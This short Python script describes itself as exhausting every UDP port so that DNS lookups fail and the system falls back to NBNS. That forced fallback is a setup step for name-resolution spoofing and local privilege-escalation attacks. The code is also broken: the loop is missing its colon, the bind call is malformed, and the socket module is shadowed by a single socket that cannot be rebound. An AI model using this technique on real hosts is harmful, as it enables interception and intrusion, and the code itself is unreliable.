#!/usr/bin/python
__author__ = "F3n3s7ra"
# Exhausts all UDP ports so a DNS request will fail and a fallback to NBNS will occur


import socket

socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

hostname = 'localhost'

for port in range(0, 65536)
        socket.bind(hostname, port)
